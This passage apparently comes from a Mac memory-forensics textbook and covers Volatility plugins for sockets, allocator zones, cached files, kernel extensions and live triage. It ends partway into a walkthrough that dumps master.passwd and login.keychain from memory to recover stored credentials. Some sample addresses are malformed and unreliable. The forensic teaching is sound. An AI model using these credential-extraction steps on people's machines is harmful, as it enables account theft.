$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 -f 10.8.3x64.vmem 
          mac_netstat
Volatility Foundation Volatility Framework 2.4 
Proto  Local IP     Local Port  Remote IP  Rem Port State       Process
------ ----------   ----------  ---------- -------- --------    ---------------
UDP    0.0.0.0             137  0.0.0.0          0              launchd/1
UDP    0.0.0.0             138  0.0.0.0          0              launchd/1
TCP    ::1                 631  ::               0  LISTEN      launchd/1
TCP    127.0.0.1           631  0.0.0.0          0  LISTEN      launchd/1
UDP    ::                    0  ::               0              configd/17
       ::                    0  ::               0              configd/17
UDP    0.0.0.0           58570  0.0.0.0          0              syslogd/19
UDP    0.0.0.0            5353  0.0.0.0          0              mDNSResponder/34
UDP    ::                 5353  ::               0              mDNSResponder/34
UDP    0.0.0.0           49603  0.0.0.0          0              mDNSResponder/34
UDP    ::                49603  ::               0              mDNSResponder/34
UDP    0.0.0.0           53921  0.0.0.0          0              mDNSResponder/34
UDP    0.0.0.0             123 0. 0.0.0          0              ntpd/51
UDP    ::                  123 ::                0              ntpd/51
UDP    fe80:1::1           123 ::                0              ntpd/51
UDP    127.0.0.1           123 0.0.0.0           0              ntpd/51
UDP    ::1                 123 ::                0              ntpd/51
UDP    192.168.55.230      123 0.0.0.0           0              ntpd/51
UDP    0.0.0.0             138 0.0.0.0           0              netbiosd/65
UDP    0.0.0.0             137 0.0.0.0           0              netbiosd/65
TCP    192.168.55.230    49156 17.171.27.65    443  ESTABLISHED apsd/84
UDP    0.0.0.0               0 0.0.0.0           0              locationd/185
```

In addition to the connection information, `mac_netstat` also tells you which process started the network activity.

#### Networking Subsystem

Besides the per-process `socket` structures, the kernel also keeps records that track currently allocated network structures for each socket type (TCP, UDP, IP, RAW). The information stored for these protocols includes a parallel linked list and hash table of `inpcb` structures. The `mac_network_conns` plugin enumerates these data structures in order to recover all active network connections.

```
$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 -f 10.8.3x64.vmem 
    mac_network_conns
Volatility Foundation Volatility Framework 2.4 
Offset (V)         Proto Local IP        Local Port Remote IP   Port State
------------------ ----- --------------- ---------- ------------ --- -------
0xffffff80305b6468 TCP   192.168.55.230  49156      17.171.27.65 443 ESTABLISHED
0xffffff80305b6488 TCP   127.0.0.1       631        0.0.0.0        0 LISTEN
0xffffff80305b1ba0 TCP   0.0.0.1         631        0.0.0.0        0 LISTEN
0xffffff80305b6bc0 TCP   0.0.0.1         631        0.0.0.0        0 LISTEN
0xffffff803021eae0 UDP   254.44.43.52    123        0.0.0.0        0
0xffffff803021f8c8 UDP   192.168.55.230  123        0.0.0.0        0
<snip>
```

#### Cross-Reference Advantage

After seeing `mac_netstat` and `mac_network_conns`, you might wonder why both are needed. They are necessary because each provides a different context. For instance, `mac_netstat` can report the process that started a connection, but `mac_network_conns` cannot. However, `mac_network_conns` is advantageous because it can find all network connections regardless of what code initiated them. So if a malicious kernel extension receives or sends network data, `mac_network_conns` can find the connection, whereas `mac_netstat` cannot.

#### Classifying Network Connections

Both of the previous plugin outputs were generated from clean systems, and there were a number of sockets across several processes. When performing memory forensics, you should be familiar with what network sockets are *normally* active so that you can more easily spot malicious ones. [Table 29-1](#table29-1) categorizes listening sockets that you will likely encounter when you analyze Mac systems. Note that this table lists only Mac-specific data, not information that you find across operating systems such as FTP servers listening on TCP port 21.

*[Table 29-1](#tableanchor29-1): Common Mac Network Sockets*

|  |  |  |  |
| --- | --- | --- | --- |
| **Application** | **Protocol** | **Port** | **Purpose** |
| launchd (PID 1) | UDP | 137 | NetBIOS. |
| launchd (PID 1) | UDP | 138 | NetBIOS. |
| launchd (PID 1) | TCP | 631 | Printing (CUPS). This socket should be in the LISTENING state. |
| apsd | TCP | 5223 | Apple’s push notification service daemon. This connection is normal if the remote IP is within Apple’s IP range. |
| netbiosd | UDP | 137 | NetBIOS. |
| netbiosd | UDP | 138 | NetBIOS. |
| mDNSResponder | UDP | 5353 | 5353 is the main mDNSResponder port. |
| mDNSResponder | UDP | 40000-60000 | mDNS will listen on a range of very high network ports for connections. |

[Table 29-1](#table29-1) lists the most commonly seen daemons and processes that perform network activity on default Mac systems. When you encounter network activity that the table does not categorize, you have a few other options to try and classify the connections. For example, `syslogd` and `ntpd` are not listed because they’re not specific to Mac. However, they’re standard on Linux/BSD. If you don’t recognize other services, consider the local and remote ports being used, and the reputation of the remote IPs (if any); then analyze the other activity being performed by the process or kernel module (its open file descriptors, loaded libraries, etc.).

## SLAB Allocator

This chapter has so far focused on artifacts related to processes, their memory mappings, and their interactions with the system and network. The next several sections focus on artifacts related to the kernel and its core data structures. We begin this exploration by studying the kernel’s main memory allocator: the SLAB allocator.

The SLAB allocator is used to allocate and deallocate memory structures that are frequently created and discarded. Examples of such structures include those related to process and thread creation, file system interaction, network activity, and interprocess communication. An interesting attribute of the SLAB allocator is that it keeps track of previously freed objects to quickly reuse them. Thus, during memory forensics examinations, you can leverage these freed entries within the zones to provide historical context of system activity.

---

## **Data Structures**

Each structure backed by a SLAB cache is represented by a `zone`:

```
>>> dt("zone")
'zone' (592 bytes)
0x0   : count                          ['int']
0x8   : free_elements                  ['unsigned long']
<snip>
0x198 : elem_size                      ['unsigned long']
0x1a0 : alloc_size                     ['unsigned long']
0x1a8 : sum_count                      ['unsigned long long']
<snip>
0x218 : zone_name                      ['pointer', ['String', {'length': 256}]]
<snip>
```

Free elements of a zone are represented by a `zone_free_element` structure:

```
>>> dt("zone_free_element")
'zone_free_element' (8 bytes)
0x0   : next                           ['pointer', ['zone_free_element']]
```

## **Key Points**

The key points for `zone` are these:

- `count`: The number of objects currently allocated from the zone.
- `free_elements`: A pointer to the first free element of the zone. They are of type `zone_free_element`.
- `elem_size`: The size of each object allocated from the zone.
- `sum_count`: The total number of objects allocated from the zone. Subtracting the `count` value from it gives the number of objects freed from the zone since its creation.
- `zone_name`: The name of the zone (proc, tasks, etc.).

The key points of the `zone_free_element` structure are these:

- `next`: A pointer to the next free element within the zone.

---

To illustrate the zones of a typical Mac system, the output of the `mac_list_zones` plugin is shown. In this plugin’s output, you can see the name of the zone along with the number of active and free elements:

```
$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 -f 10.8.3x64.vmem 
     mac_list_zones
Volatility Foundation Volatility Framework 2.4 
Name                           Active Count Free Count Element Size
------------------------------ ------------ ---------- ------------
zones                                   182          0          592
vm.objects                            18840      88522          224
vm.object.hash.entries                 5059        101           40
maps                                    108      56790          232
VM.map.entries                        36293     266241           80
Reserved.VM.map.entries                  72       3996           80
VM.map.copies                             0       1887           80
pmap                                     96        347          256
vm.pages                             511869      88151           72
tasks                                    90        138          928
threads                                 364       1641         1360
mbuf                                      0          0          256
socket                                  270        863          880
zombie                                    0        138          144
namei                                     0      18184         1024
proc                                     89        138         1120
udpcb                                    52        230          392
tcpcb                                     1          3          992
llinfo_arp                                3          1           56
<snip>
```

Many of these zones, such as `proc` (processes), `tasks` (task structures), `sockets` (socket objects), `udpcb` (UDP connections), `tcpcb` (TCP connections), and `llinfo_arp` (ARP data) should look familiar. Note that within the memory sample analyzed—which came from a system that had recently rebooted—there are already a number of freed objects of various types.

The following shows the output of `mac_dead_procs` against this memory sample. This plugin operates by finding the `proc` zone, enumerating its free elements, casting each element as a `proc` structure, and then reporting the process information.

```
$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 
   -f 10.8.3x64.vmem mac_dead_procs
Volatility Foundation Volatility Framework 2.4 
Offset             Name    Pid   Uid  Gid  PGID    Bits DTB  Start Time
------------------ ------- ----  ---- ---- ----    ---- ---  ------------------
0xffffff803012b8e0 backupd  30      -  -   -55...11  -   -   2013-05-14 15:19:53 
0xffffff803012b8e0 backupd  30      -  -   -55...11  -   -   2013-05-14 15:19:53 
0xfffffc80f030f5e000 mdworker 226     -  -   -55...11  -   -   2013-05-14 15:21:04 
0xffffff8033459a40 path     221     -  -   -55...11  -   -   2013-05-14 15:20:22 
<snip>
0xffffff80334588c0 ???????? -55...37 - -  -55...37   -   -
```

Several of the members—such as UID, GID, Bits, and DTB—print “-” because they point to memory ranges that were freed since the process exited. However, the intact information is still quite useful because it includes the name, PID, and start time of each recovered historical process.

Volatility also provides the `mac_dead_sockets` and `mac_dead_vnodes` plugins that can recover historical information of the respective types. Due to the Volatility `zone` API, if historical records of other types are ever needed during an investigation, you can easily write a plugin to find and report the artifacts.

## Recovering File Systems from Memory

As you saw when you learned about the `dumpfiles` plugin for Windows (Chapter 16) and the `linux_recover_filesystem`plugin (Chapter 24) for Linux, recovering files from the in-memory file cache can greatly aid analysis. This section covers the plugins that enable examination and extraction of cached files stored on Mac systems. In this section, you learn how Mac caches files in memory and the strategies you can use to focus on key files. In Chapter 31, you revisit the plugins from this section to recover a number of files that are useful to track user activity on Mac systems.

---

## **Analysis Objectives**

Your objectives are these:

- **Recover files from memory**: There are many investigative scenarios in which you receive only a memory sample, not the corresponding disk image. By analyzing the operating system’s cache of files in memory, you can recover full files without the need for disk images.
- **Use file metadata to create timelines**: Besides raw file contents, the kernel also keeps track of metadata related to files, such as MAC times, owner, and permissions. This metadata from memory can help you create timelines and perform keyword searching (on the filenames).

## **Data Structures**

Each file in memory is represented by a `vnode` structure:

```
>>> dt("vnode")
'vnode' (248 bytes)
0x0   : v_lock                         ['__unnamed_14874329']
0x10  : v_freelist                     ['__unnamed_14887332']
0x20  : v_mntvnodes                    ['__unnamed_14887386']
<snip>
0x70  : v_un                           ['__unnamed_14887713']
<snip>
0xb0  : v_name                         ['pointer', ['String', {'length': 256}]]
0xb8  : v_parent                       ['pointer', ['vnode']]
```

The contents of the file are stored differently depending on the type of file:

```
>>> dt("__unnamed_14887713")
'__unnamed_14887713' (8 bytes)
0x0   : vu_fifoinfo                    ['pointer', ['fifoinfo']]
0x0   : vu_mountedhere                 ['pointer', ['mount']]
0x0   : vu_socket                      ['pointer', ['socket']]
0x0   : vu_specinfo                    ['pointer', ['specinfo']]
0x0   : vu_ubcinfo                     ['pointer', ['ubc_info']]
```

The contents of regular files are stored using the `ubc_info` structure:

```
>>> dt("ubc_info")
'ubc_info' (72 bytes)
0x0   : ui_pager                       ['pointer', ['memory_object']]
0x8   : ui_control                     ['pointer', ['memory_object_control']]
<snip>
```

The `memory_object_control` structure controls all operations on the file’s contents:

```
>>> dt("memory_object_control")
'memory_object_control' (16 bytes)
0x0   : moc_ikot                       ['unsigned int']
0x4   : _pad                           ['unsigned int']
0x8   : moc_object                     ['pointer', ['vm_object']]
```

The `vm_object` structure holds the queue of physical pages backing a file:

```
>>> dt("vm_object")
'vm_object' (224 bytes)
0x0   : memq                           ['queue_entry']
<snip>
```

Each physical page is represented by a `vm_page` structure:

```
>>> dt("vm_page")
'vm_page' (72 bytes)
0x0   : pageq                          ['queue_entry']
0x10  : listq                          ['queue_entry']
0x20  : next                           ['pointer', ['vm_page']]
<snip>
0x3c  : phys_page                      ['unsigned int']
```

## **Key Points**

The key points for struct `vnode` are these:

- `v_mntvnodes`: Linkage into the list of other `vnode` structures that belong to a mount point.
- v_un: An anonymous union of types that you use based on the type of file represented by the `vnode`. You can use this union to represent regular files and directories, sockets, and IPC pipes.
- `v_name`: The name of the `vnode`.
- `v_parent`: The parent of this `vnode`. You can use this pointer to build the full path of the `vnode` on disk.

The key points of struct `ubc_info` are these:

- `ui_pager`: A reference to the pager that handles read/write operations on the `vnode` and its backing store
- `ui_control`: A reference to the structure that brokers operations on the file through IPC messages and contains the set of physical pages backing a file

The key points of `memory_object_control` are these:

- `moc_ikot`: The IPC message handler for the object
- `moc_object`: A reference to the `vm_object` structure that holds the queue of the file’s pages

The key points of `vm_page` are these:

- `next`: The next physical page in the list of the file’s pages.
- `phys_page`: The page frame number of the page in physical memory. You can find the contents of the page by multiplying this number by the page size (4096) and reading the data at that offset in physical memory.

---

Volatility provides two methods to recover files from memory for Mac OS X. The first method allows you to list all available files in the memory dump and then selectively recover individual files by using `mac_list_files` and `mac_dump_file`. Running `mac_list_files` produces the full path of each file in memory along with the virtual address of its `vnode` structure, as shown here:

```
$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 -f 10.8.3x64.vmem 
      mac_list_files
Volatility Foundation Volatility Framework 2.4 
Offset (V)         File Path
------------------ ---------
0xfffffc80f030f05e88 /Macintosh HD/private/etc/master.passwd
0xffffff8032811aa8 /Macintosh HD/Library/Keychains/apsd.keychain
0xffffff80393b5d10 /Macintosh HD/Library/Keychains/apsd.keychain
<snip>
```

Once a file of interest is found, which in this example is `/etc/master.passwd`, the virtual address can then be passed to `mac_dump_file`:

```
$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 -f 10.8.3x64.vmem 
       mac_dump_file  -q 0xfffffc80f030f05e88 -O master.passwd
Volatility Foundation Volatility Framework 2.4 
Wrote 4096 bytes to master.passwd from vnode at address fffffc80f030f05e88

$ head -20 master.passwd
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2::0:0:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0::0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1::0:0:System Services:/var/root:/usr/bin/false
_uucp:*:4:4::0:0:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13::0:0:Task Gate Daemon:/var/empty:/usr/bin/false
_networkd:*:24:24::0:0:Network Services:/var/empty:/usr/bin/false
_installassistant:*:25:25::0:0:Install Assistant:/var/empty:/usr/bin/false
_lp:*:26:26::0:0:Printing Services:/var/spool/cups:/usr/bin/false
_postfix:*:27:27::0:0:Postfix Mail Server:/var/spool/postfix:/usr/bin/false
_scsd:*:31:31::0:0:Service Configuration Service:/var/empty:/usr/bin/false
```

We were able to recover the full contents of the user database directly from the memory dump.

The second method for recovering files from memory is through the `mac_recover_filesystem` plugin. This plugin operates the same as `linux_recover_filesystem` (which was discussed in Chapter 24) in that it recovers the full file system structure, including metadata, to the directory that the user specifies. Using the gathered metadata (MAC times, file owner and permission, etc.), you can create detailed timelines of file system activity. You can also use the recovered file system’s metadata to automate common tasks, such as gathering all the files of a specific user or looking for files that attackers and malware create and modify.

Internally the file system plugins operate by first finding the list of mount points and then walking the mount point’s `vnode` structures. Each mount point is represented by a `mount` structure, and you enumerate them in Volatility through the `mac_mount` plugin. The `mnt_vnodelist` member of `mount` holds a pointer to the first `vnode` of the file system, and the `v_mntnodes` member is then used to enumerate the rest of the files.

## Loaded Kernel Extensions

As you saw with Windows and Linux, a common technique utilized by malware is to load kernel modules (called extensions in Mac OS X). By implementing a rootkit as a kernel module, the malware author has complete control over the running kernel and the system’s hardware devices. In this section, you learn how to find and extract kernel modules, both benign and malicious. In Chapter 30, you see several Mac kernel rootkits that operate using kernel extensions. You also see how Volatility can detect both the kernel extensions and report on the actions that rootkits perform once they load.

---

## **Analysis Objectives**

Your objectives are these:

- **Find kernel modules in memory**: To locate kernel modules in memory, you must understand their related data structures and how they are loaded in memory.
- **Extract kernel modules from memory to disk**: The ability to extract kernel modules to disk creates a number of possibilities, such as static reverse engineering and signature scanning.
- **Understand the limitations of analysis of modules extracted from memory**: Modules extracted from memory can have limitations that frustrate analysis. The limitations include these: the module cannot be loaded on another system for dynamic analysis, pages of the module might not be not present in memory due to paging, and malware can tamper with analysis by overwriting parts of the file’s metadata.

## **Data Structures**

Each kernel module is represented by a `kmod_info` structure:

```
>>> dt("kmod_info")
'kmod_info' (196 bytes)
0x0   : next                           ['pointer', ['kmod_info']]
<snip>
0x10  : name                           ['String', {'length': 64}]
<snip>
0x9c  : address                        ['unsigned long']
0xa4  : size                           ['unsigned long']
0xac  : hdr_size                       ['unsigned long']
0xb4  : start                          ['pointer', ['void']]
0xbc  : stop                           ['pointer', ['void']]
```

The IOKit subsystem maintains its own set of loaded kernel modules, which are represented by the `OSKext` C++ class. Note that the Volatility Mac profile creation code renames C++ classes to `<name>_class` to avoid conflicts when there are C structures and C++ classes of the same name.

```
>>> dt("OSKext_class")
'OSKext_class' (120 bytes)
0x10  : infoDict                       ['pointer', ['OSDictionary_class']]
0x18  : bundleID                       ['pointer', ['OSSymbol_class']]
0x20  : path                           ['pointer', ['OSString_class']]
<snip>
0x48  : kmod_info                      ['pointer', ['kmod_info_class']]
<snip>
```

## **Key Points**

The key points for struct `kmod_info` are these:

- `next`: A pointer to the next kernel module in the list
- `name`: The name of the kernel module
- `address`: The load address of the module’s Mach-O file in memory
- `size`: The size of the Mach-O file
- `start`: Pointer to the initialization routine for the module
- `stop`: Pointer to the routine called when the module is unloaded

The key points for class `OSKext` are these:

- `path`: The full path of the module on disk. This information is not available solely from the `kmod_info` structure.
- `kmod_info`: A pointer to the module’s `kmod_info` structure

---

### Enumerating Kernel Modules

Mac stores kernel modules in two data structures. The first is the list of modules referenced in the `kmod` global variable. The first member of this list actually represents the last module loaded onto the system. By following the `next` pointer of each module, all kernel modules can be enumerated in the *reverse* order of loading, which is implemented in the `mac_lsmod` plugin:

```
$ python vol.py -f 10.9.1.vmem --profile=MacMavericks_10_9_1_AMDx64 mac_lsmod
Volatility Foundation Volatility Framework 2.4 
Offset (V)         Module Address     Size       Refs   Version      Name
------------------ ------------------ -------- -------- ------------ ----
0xffffff7f85a2b538 0xffffff7f85a27000    20480    0     1.60         
           com.apple.driver.AudioAUUC
0xffffff7f85a2b538 0xffffff7f854c3000    28672    0     650.4.0               
           com.apple.driver.AppleUSBMergeNub
0xffffff7f854c6e18 0xffffff7f85790000   118784    0     4.2.0f6        
           com.apple.iokit.IOBluetoothHostControllerUSBTransport
0xffffff7f857a4a70 0xffffff7c85f045c000    36864    0     650.4.4         
           com.apple.iokit.IOUSBHIDDriver
0xffffff7f85461e80 0xffffff7c85f050b000    16384    0     4.2.1b2          
           com.apple.driver.AppleUSBCDC
0xffffff7c85f050e9e8 0xffffff7f85465000    28672    1     650.4.0        
           com.apple.driver.AppleUSBComposite
0xffffff7f85468488 0xffffff7c86f015a000    40960    0     0137.86.37    
          com.vmware.kext.vmhgfs

<snip>

0xffffff7f860fa898 0xffffff7f84eba000   167936    19    2.8          
          com.apple.iokit.IOPCIFamily
0xffffff7f84ed4144 0xffffff7c85f011e000    36864    16    1.4          
          com.apple.iokit.IOACPIFamily
0xffffff7f85121a20 0xffffff7f85385000   290816    2     1.0          
          com.apple.kec.corecrypto
0xffffff7f853c54e0 0xffffff7f851aa000    45056    0     1            
          com.apple.kec.pthread
0xffffff7f851b2270 0x0000000000000000        0    48    13.0.0       
          com.apple.kpi.unsupported
0xffffff800a9dc000 0x0000000000000000        0    34    13.0.0       
          com.apple.kpi.private
0xffffff800a9dc100 0x0000000000000000        0    73    13.0.0       
          com.apple.kpi.mach
0xffffff800a9dc200 0x0000000000000000        0    86    13.0.0       
          com.apple.kpi.libkern
0xffffff800a9dc300 0x0000000000000000        0    81    13.0.0       
          com.apple.kpi.iokit
0xffffff800a9dc400 0x0000000000000000        0    6     13.0.0       
          com.apple.kpi.dsep
0xffffff800a9dc500 0x0000000000000000        0    62    13.0.0       
          com.apple.kpi.bsd
```

The plugin reports the virtual address of the `kmod_info` structure and the module’s Mach-O header, the size of the module, the number of references, the version, and the module name. Note that the last seven modules have a base address and size of 0, and a prefix of “com.apple.kpi”. These are the “fake” modules set up by the kernel so the kernel programming interfaces (KPIs) can be referenced through normal APIs.

The second data structure that tracks loaded kernel modules is the `sLoadedKexts` array inside of IOKit. The first reference to this artifact was snare’s presentation at Kiwicon 2011 ([http://ho.ax/downloads/Defiling_Mac_OS_X_Kiwicon.pdf](http://ho.ax/downloads/Defiling_Mac_OS_X_Kiwicon.pdf)). This array is stored using the `OSArray` class, and each element is of type `OSKext`. The `mac_lsmod_iokit` plugin can enumerate this array. It reports the same information as `mac_lsmod`, except that it also includes the full pathname for the module. For example, it displays `/System/Library/Extensions/corecrypto.kext` rather than `com.apple.kec.corecrypto`.

### Recovering Modules from Memory

Once you find a kernel module of interest, you can then extract it to disk using the `mac_moddump` plugin. In the following invocation, the `AudioAUUC`.`kext` kernel extension shown in the `mac_lsmod` output is extracted:

```
$ python vol.py -f 10.9.1.vmem --profile=MacMavericks_10_9_1_AMDx64 
   mac_moddump -D dumpdir -b 0xffffff7f85a2b538
Volatility Foundation Volatility Framework 2.4 
Address            Size     Output Path
------------------ -------- -----------
0xffffff7f85a27000    20480 com.apple.driver.AudioAUUC.0xffffff7f85a2b538.kext

$ file dumpdir/com.apple.driver.AudioAUUC.0xffffff7f85a2b538.kext
dumpdir/com.apple.driver.AudioAUUC.0xffffff7f85a2b538.kext: 
Mach-O 64-bit kext bundle x86_64
```

The operation of this plugin is actually very simple. The `address` member of `kmod_info` points to the base address of the Mach-O file in kernel memory, and the `size` member is the size of the Mach-O file. All the plugin must do is read `size` of bytes starting at `address` and write this data to disk.

## Other Mac Plugins

Many Mac plugins mirror functionality already described in the Linux-related chapters. So to avoid redundancy, the following list just introduces and discusses these plugins at a basic level.

- `mac_psaux`: Recovers the command-line arguments of a process, which is useful to determine which configuration flags were passed to an application.
- `mac_lsof`: Lists the open file descriptors of a process. Its output is formatted exactly like `linux_lsof`, in which the file descriptor number is listed along with the full path on disk for each file. For complete information on the data structures involved with `mac_lsof` we suggest reading Andrew F. Hay’s masters thesis ([http://reverse.put.as/wp-content/uploads/2011/06/FORENSIC-MEMORY-ANALYSIS-FOR-APPLE-OS-X.pdf](http://reverse.put.as/wp-content/uploads/2011/06/FORENSIC-MEMORY-ANALYSIS-FOR-APPLE-OS-X.pdf)).
- `mac_mount`: Provides information similar to `linux_mount`. For each mounted file system, the physical device, mount point, and file system type is listed.
- `mac_list_sessions`**:** Lists each login session along with the user that started the session and the session leader process.
- `mac_ifconfig`: This plugin is similar to `linux_ifconfig` and it lists the name and IP address of each network interface.
- `mac_dmesg`: Dumps the kernel debug buffer. Its Linux counterpart is `linux_dmesg`.
- `mac_route`: Lists the kernel’s routing table like its Linux counterpart `linux_route`.
- `mac_arp`: Lists the kernel’s ARP cache like its Linux counterpart `linux_arp`.
- `mac_bash`: Recovers the commands entered into the bash shell.
- `mac_bash_hash`: Recovers the command alias hash table.
- `mac_bash_env`: Recovers the environment variables of the bash session.

## Mac Live Forensics

Now that you have learned how to recover a wide range of information through memory forensics, we want to show you how to recover similar information from the live system. However, before you perform live forensics, you should be aware of its advantages and disadvantages. The main disadvantages are the ease in which malware can subvert live forensics tools, the inability to recover historical data, and the potential to destroy evidence by running commands on the live system. Because system administrators and security tools often rely on the live system APIs to find malware infections, attackers make a concerted effort to filter data out of the operating system’s reporting channels. This makes it difficult to detect advanced malware on a running system.

Likewise, the inability of live forensics tools to recover historical data stems from the fact that it can find and report only information that the kernel currently tracks. Because the system no longer uses historical data, the kernel has no need to keep a reference to it. Memory forensics analyzes physical memory without reliance on the live system’s reporting APIs, so it has the capability to both find malware hiding from live systems as well as find historical artifacts.

Even with its limitations, live forensics is useful in several situations. For example, there are times when you cannot acquire a full physical memory dump. It can occur due to lack of privileges, anti-forensics, or inaccessible memory dumping tools. Also, live APIs can provide a user’s view of the system resources, which can provide valuable information for detection or context about attacker intent.

[Table 29-2](#table29-2) shows information that is commonly collected from live machines as well as the counterpart Linux approach. You can group these commands into a live triage script that you can then include in your on-site field kit.

*[**Table 29-2**](#tableanchor29-2): Live Forensics Commands and Uses*

|  |  |  |
| --- | --- | --- |
| **Mac Command** | **Linux Command** | **Remarks** |
| `ps -ef` | `ps aux` | Lists each process with its name, command-line arguments, privileges, start time, and so on. |
| `vmmap` | `cat /proc/<pid>/maps` | Lists the memory mappings (application, shared libraries, stack, heap, etc.) of each process. |
| `lsof` | `lsof ls /proc/<pid>/fd` | Lists the open file handles of each process. |
| `netstat -an lsof -i` | `netstat -pan` | Lists the active network connections of the system along with the starting process. Note: On Mac, `netstat` does not show the PID of the owning process. Instead, you must use `lsof` to get this information. Note: The `n` flag to `netstat` tells it not to resolve DNS names and to print only the IP address. This can be useful to avoid resolving malware-related domains because they can rapidly change, and the DNS request can also tip off malware authors to your investigation. |
| `netstat -nr` | `route` | Lists the kernel’s routing table. |
| `arp -a` | `arp -a` | Lists the ARP cache. |
| `kextstat` | `lsmod cat /proc/modules` | Lists the set of currently loaded kernel modules/extensions. |
| `mount` | `mount` | Lists mounted file systems and their backing devices. |
| `uname` | `uname` | Lists the version of the kernel installed. |
| `uptime` | `uptime` | Lists the time since the last reboot. |
| `w / who / last` | `w / who / last` | Lists currently logged-in users and the last time each user account logged in. |
| `ifconfig` | `ifconfig` | Lists the network interfaces attached to the system. |
| `dmesg` | `dmesg` | Prints the kernel debug buffer. |
| `N/A` | `cat /proc/iomem` | Lists the regions of physical memory known to the kernel. Currently not available to userland tools on Mac. |
| `sysctl -a` | `sysctl -a` | Lists all `sysctl` names with their current value. |
| `history` | `history` | Returns the commands read from the `.bash_history` file of the current user along with commands from the current session. By default, `bash` writes to the history file only upon a clean termination of the shell. This means commands entered into active sessions might not yet be stored on disk. |
| `hash` | `hash` | Lists the mapping of commands run by the user (e.g., `ls`) to the full file path on disk (e.g., `/bin/ls`) as well as the number of times each command was run. You can use it to find proof of executed applications as well as malicious tampering of the bash environment (see Chapter 21). |

## Summary

Mac OS X is similar to Linux in many ways, because the two operating systems share common roots. Thus, the analysis techniques you implement on Linux (which you learned in Part III of this book) are often available and effective on Mac OS X. In particular, you can analyze processes, network activity, file system evidence, loaded kernel extensions, dynamic shared cache, and the SLAB allocator’s historical zone records. However, there are also key differences that can be critical during an investigation of Mac OS X systems, such as artifacts left by IOKit. Combining this Mac-specific knowledge with the techniques you learned about Linux gives you a powerful set of capabilities to leverage during memory forensics investigations.
# Chapter 30 Malicious Code and Rootkits

This chapter covers a wide range of userland and kernel rootkit techniques used against Mac systems. If you have read the Windows and Linux sections of this book, some of these rootkit techniques might look familiar to you because Mac OS X must perform many of the same tasks as the other operating systems. On the other hand, Mac’s unique design lends itself to several interesting attack vectors against technologies such as IOKit and TrustedBSD. Throughout this chapter, we explain these facilities along with how rootkits, such as Rubilyn and Crisis, can subvert them and how memory forensics can detect the malicious modifications. We also cover analysis of some common Mac malware samples, such as OSX.GetShell and OSX.FkCodec, including how to enumerate both network and persistence artifacts.

## Userland Rootkit Analysis

In Chapter 29, you learned how to track a process’ activities such as opening files, making network connections, and loading shared libraries. Although these activities are certainly useful for detecting indirect artifacts created by rootkits, the upcoming section focuses on specific artifacts created by purely malicious actions. In particular, you’ll see examples of malware that hides in process memory (i.e. code injection) and alters call tables and executable instructions (API hooking) in process memory. These rootkits can control the view of system state presented to administrative and live forensic analysis tools that also ...
# Chapter 31  
 Tracking User Activity

Mac systems are primarily used as personal computers (laptops, desktops, workstations) rather than servers. Thus, the focus of many forensic investigations is tracking a suspect or victim’s activity based on artifacts created by web browsers, address books, e-mail and chat clients, word processors, social media applications, and calendars. These types of applications handle a large amount of relevant information that is stored only in memory. For example, this chapter shows how you can recover unencrypted PGP e-mail and Off-the-Record (OTR) instant messages, cached keychain private keys, and so on. In addition, we describe the steps we took while researching evidence stored in unfamiliar/undocumented formats. This will provide valuable insight into how you can extend these techniques to new applications during your own investigations.

## Keychain Recovery

Keychain, which is Apple’s built-in password manager, can be used to save credentials for websites, wireless networks, SSH servers, private keys, and more. The credentials are stored on disk within an encrypted (3DES) container that requires a *master* password from the user to unlock. During an investigation, you might need access to the stored credentials—to analyze the user’s e-mail, social media, or cloud storage account, for example.

You have a few options for acquiring the credentials:

- Ask the user for the master password
- Brute force the master password
- Attempt to extract the master password or the 3DES encryption key from memory

Although the first option is the most straightforward, it’s not likely to work with uncooperative suspects. Similarly, depending on the length and complexity of the master password, brute forcing can be very time-consuming and computationally expensive. The last option, however, may be the most fruitful, assuming that you have a memory dump from a time when the user was logged in to the computer.

---

**NOTE**

Accessing accounts that you don’t own can be illegal. We present this information in the context of a law enforcement situation in which officers have obtained permission to perform such actions.

---

### Volafox and Chainbreaker

Kyeongsik Lee of the volafox project ([http://code.google.com/p/volafox](http://code.google.com/p/volafox)) presented a novel approach to extract the 3DES encryption keys from memory and use them to decrypt keychain files. Lee’s research, which was presented at CodeGate 2013 ([http://forensic.n0fate.com/wp-content/uploads/2012/12/Breaking-the-keychain-from-digital-forensic-perspective-Codegate-2013.pdf](http://forensic.n0fate.com/wp-content/uploads/2012/12/Breaking-the-keychain-from-digital-forensic-perspective-Codegate-2013.pdf)), also introduced open source tools capable of automating the required steps. The first component, a plugin for the volafox project named `keychaindump`, locates potential encryption keys by searching within the heaps of the security daemon process (`securityd`). The second component is a Python tool named chainbreaker ([https://github.com/n0fate/chainbreaker](https://github.com/n0fate/chainbreaker)) that can take the output of the `keychaindump` plugin and a locked keychain file and print all the stored credentials.

### Breaking Keychains in Memory

The following commands show how to recover a keychain file from memory and then unlock it using Volatility and chainbreaker. First, locate the operating system’s cached copy of the `login.keychain` file using the `mac_list_files` plugin. You can then extract it with the `mac_dump_file` plugin:

```
$ python vol.py -f applemail.mem --profile=MacLion_10_7_3_AMDx64 
      mac_list_files > files.txt
Volatility Foundation Volatility Framework 2.4 

$ grep login.keychain files.txt
0xffffff800e4ef9b0 /Macintosh HD/Users/sherry/Library/Keychains/
     login.keychain.sb-ad335571-h1adIf/..namedfork/rsrc
0xffffff800adb44d8 /Macintosh HD/Users/sherry/Library/Keychains/login.keychain

$ python vol.py -f applemail.mem --profile=MacLion_10_7_3_AMDx64 
    mac_dump_file -q 0xffffff800adb44d8 
    -O login.keychain.0xffffff800adb44d8
Volatility Foundation Volatility Framework 2.4 
Wrote 32768 bytes to login.keychain.0xffffff800adb44d8 from vnode at 
address ffffff800adb44d8
```

Next, use the `mac_keychaindump` plugin to list possible encryption keys. Note that this plugin is a direct port of the original volafox `keychaindump` plugin.

```
